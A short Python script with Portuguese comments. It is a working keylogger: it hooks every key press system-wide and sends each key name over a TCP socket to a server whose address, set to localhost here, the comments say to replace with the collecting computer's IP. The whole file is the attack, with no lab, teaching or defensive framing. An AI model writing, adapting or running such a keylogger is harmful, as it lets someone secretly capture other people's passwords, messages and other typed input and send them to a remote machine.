
import keyboard
import socket
host = 'localhost' # IP do Computador do servidor
port = 8082 # Porta do computador com servidor
server = (host,port)
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(server)


    
def keypress(event):
    if event.name:
        sock.send(bytes(str(event.name), 'utf-8'))
            
    

keyboard.on_press(keypress)
keyboard.wait()